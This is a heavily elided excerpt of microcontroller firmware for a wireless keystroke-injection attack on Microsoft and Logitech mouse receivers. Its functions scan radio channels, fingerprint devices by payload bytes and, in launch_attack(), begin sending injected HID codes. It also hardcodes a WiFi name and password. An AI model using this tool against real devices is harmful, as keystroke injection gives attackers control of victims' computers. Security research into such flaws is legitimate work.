...
const char* ssid = "ecv2"; // Your WiFi AP SSID 
const char* password = "totototo"; // Your WiFi Password
const int wifi_channel = 14; //Enter your preferred Wi-Fi Channel
...
//    WebSerial.print(char(Serial.read()));
//  }
  return;
}
...
void scan() {
  ...
  WebSerial.println("starting scan...");
...
//  radio.printDetails();
  ...
  while (1) {
    ...
    if (channel > 84) {
      ...
      WebSerial.println("starting channel sweep");
        ...
        for (offset = 0; offset < 2; offset++) {
          ...
          if (payload_length <= (PAY_SIZE-9))
          {
            ...
            if (crc == crc_given) {
              ...
              WebSerial.print("found packet /w valid crc... ");

              if (payload_length > 0) {
                Serial.print("payload length is ");
                Serial.println(payload_length);
                WebSerial.print("payload length is ");
                WebSerial.println(payload_length);
                // Write the address
                address = 0;
                for (int i = 0; i < 4; i++)
                {
                ...
                WebSerial.println("payload is empty. scanning...");
              }
            }
          }
        }
...
void fingerprint()
{
  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
    ...
    WebSerial.println("found MS mouse");
  ...
  if (payload_size == 19 && payload[0] == 0x0a) {
    ...
    WebSerial.println("found MS encrypted mouse");
    payload_type = MICROSOFT;
  ...
  if (payload[0] == 0) {
    ...
    if (payload_type == LOGITECH) WebSerial.println("found Logitech mouse");
  }
  return;
}
...
void launch_attack() {
  ...
  WebSerial.println("starting attack");

  if (payload_type) {
    Serial.println("payload type is injectable");
    WebSerial.println("payload type is injectable");
    ...
    for (int i = 0; i <= keycount; i++)
    {
      ...
      if (payload_type == MICROSOFT) {
        if (hid) {
          ...
          Serial.println(hid);          
          WebSerial.print("sending hid code: ");
